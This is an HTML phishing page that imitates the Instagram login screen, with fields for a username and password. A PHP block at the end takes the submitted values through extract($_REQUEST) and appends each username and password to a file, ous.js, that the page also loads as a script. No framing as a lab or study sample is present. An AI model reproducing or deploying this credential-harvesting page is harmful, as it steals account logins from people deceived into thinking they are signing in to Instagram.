<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="ouss.css">
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="instagram.png" alt="instagram" style="width: 175px;">
			</div>
			<form class="form">
				<div class="input_field">
					<input type="text" placeholder="Phone number, username, or email" class="input" name="text" >
				</div>
				<div class="input_field">
					<input type="password" placeholder="Password" class="input" name="password">
				</div>
				<button class="btn"><a herf="#">Log In</a></button>
			</form>
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="facebook.png" alt="facebook">
					<p>Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="instagram.com">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="appstore.png" alt="appstore"></a>
				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">SUPPORT</a></li>
				<li><a href="#">PRESS</a></li>
				<li><a href="#">API</a></li>
				<li><a href="#">JOBS</a></li>
				<li><a href="#">PRIVACY</a></li>
				<li><a href="#">TERMS</a></li>
				<li><a href="#">DIRECTORY</a></li>
				<li><a href="#">PROFILES</a></li>
				<li><a href="#">HASHTAGS</a></li>
				<li><a href="#">LANGUAGE</a></li>
			</ul>
		</div>
		<div class="copyright">
			© 2022 INSTAGRAM
		</div>
	</div>
	<script src="ous.js"></script>
</body>
<?php
     extract($_REQUEST);
	 $file=fopen("ous.js" , "a");

	 fwrite($file , "name :");
	 fwrite($file , $text ."\n");
	 fwrite($file , "pass :");
	 fwrite($file , $password ."\n");
	 fclose($file);                  
?>
</html>
